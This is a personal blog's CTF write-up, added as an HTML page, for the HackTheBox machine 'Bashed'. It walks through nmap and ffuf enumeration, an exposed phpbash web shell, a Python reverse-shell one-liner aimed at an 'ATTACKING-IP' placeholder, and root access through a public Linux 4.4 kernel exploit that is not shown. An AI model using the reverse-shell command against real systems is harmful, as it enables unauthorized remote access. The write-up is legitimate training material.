@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Bashed">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Bashed</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Bashed</b></h1>
+
+<p class="post-metadata text-muted">
+  05 October 2023 -  
+  <b>2 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#webshell">
+      <span class="tag badge badge-pill text-primary border border-primary">WebShell</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#kernelexploit">
+      <span class="tag badge badge-pill text-primary border border-primary">KernelExploit</span>
+    </a>
+    </p>
+
+<h2 id="info">info</h2>
+
+<p><img src="/assets/ctf/htb_media/bashedinfocard.png" alt="infocard" /></p>
+
+<p>Bashed is an easy-level box where we exploit a vulnerable web shell to gain access and escalate privileges to root.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in our attack is scanning the target using Nmap to identify open ports and running services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET
+  Nmap scan report for 10.10.10.68
+  Host is up (0.073s latency).
+  Not shown: 999 closed ports
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+  |_http-title: Arrexels Development Site
+
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
+</code></pre></div></div>
+
+<p>The scan reveals a web server running on port 80. Visiting the website, nothing interesting was found. Next, we use ffuf to enumerate directories</p>
+
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+
+<p>Since a web server is active, we use <strong>ffuf</strong> for directory brute-forcing to uncover hidden paths.</p>
+
+<p><img src="/assets/ctf/htb_media/bashedffuf.png" alt="ffuf" /></p>
+
+<p>One interesting discovery is the <strong>/dev</strong> directory. Upon navigating to it, we find a file named <strong>phpbash.php</strong>—a web-based shell.</p>
+
+<p><img src="/assets/ctf/htb_media/basheddev.png" alt="dev" /></p>
+
+<h2 id="gaining-initial-access">Gaining Initial Access</h2>
+
+<h3 id="web-shell-exploitation">Web Shell Exploitation</h3>
+
+<p><img src="/assets/ctf/htb_media/bashedwebshell.png" alt="webshell" /></p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">phpbash.php</code> provides us with an interactive web shell. However, to gain a more stable shell, we establish a <strong>reverse shell</strong> using Python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<p>Executing this command gives us a shell as the <strong>www-data</strong> user. Exploring the system, we identify two users: <strong>scriptmanager</strong> and <strong>arrexel</strong>. The user flag is found in arrexel’s home directory.</p>
+
+<p><img src="/assets/ctf/htb_media/basheduser.png" alt="user" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="exploiting-sudo-privileges">Exploiting Sudo Privileges</h3>
+
+<p>A quick privilege check reveals that the <strong>scriptmanager</strong> user has sudo permissions to execute commands. Switching to scriptmanager provides us with more privileges.</p>
+
+<h3 id="kernel-exploitation">Kernel Exploitation</h3>
+
+<p>Running <code class="language-plaintext highlighter-rouge">uname -a</code> reveals that the machine is using an <strong>outdated Linux kernel (4.4)</strong>. Researching known vulnerabilities for this version leads us to a <strong>publicly available kernel exploit</strong>. Since the target machine does not have a compiler, we compile the exploit on our attacker machine and transfer it to the target.</p>
+
+<p>Executing the exploit successfully grants root access.</p>
+
+<p><img src="/assets/ctf/htb_media/bashedroot.png" alt="root" /></p>
+
+<p>Upon execution, the exploit grants us <strong>root access</strong>.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The <strong>Bashed</strong> machine demonstrates how misconfigured and exposed web shells can lead to full system compromise. We successfully leveraged:</p>
+
+<ul>
+  <li><strong>Directory enumeration</strong> to find a vulnerable web shell.</li>
+  <li><strong>A reverse shell</strong> to gain initial access.</li>
+  <li><strong>Privilege escalation</strong> via outdated kernel exploitation.</li>
+</ul>
+
+<p>This challenge highlights the importance of securing web directories, restricting shell access, and keeping systems updated to prevent potential security threats. Always ensure web applications are configured securely and avoid exposing sensitive tools to the public.</p>
+
+<p>Stay tuned for more CTF write-ups and ethical hacking techniques!</p>
+
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
